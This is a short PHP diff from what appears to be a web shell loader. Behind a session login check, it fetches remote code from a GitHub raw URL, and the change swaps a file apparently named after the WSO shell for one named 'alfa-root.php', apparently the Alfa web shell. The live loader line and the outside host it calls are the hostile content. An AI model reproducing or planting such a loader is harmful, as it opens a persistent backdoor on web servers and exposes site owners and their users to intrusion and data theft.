@@ -39,7 +39,7 @@ function fetchContent($url) {
 
 // Jika sudah login, ambil konten dari URL
 if (isset($_SESSION['loggedin'])) {
-    $url = 'https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/kamley77wso.php';
+    $url = 'https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/alfa-root.php';
     $content = fetchContent($url);
 
     if ($content !== false) {
